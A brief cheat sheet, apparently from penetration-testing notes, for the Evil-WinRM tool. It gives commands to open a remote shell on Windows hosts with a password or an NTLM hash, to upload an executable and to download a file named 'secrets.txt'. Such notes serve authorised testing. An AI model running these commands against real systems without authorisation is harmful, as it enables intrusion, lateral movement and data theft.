# Evil-WinRM

## Purpose
WinRM shell access to Windows hosts.

## Common Commands

### Connect
`evil-winrm -i <target> -u user -p password

### Connect with hash
`evil-winrm -i <target> -u user -H NTLMHASH

### Upload file
`upload file.exe

### Download file
`download secrets.txt

## Notes
Preferred shell when WinRM available.
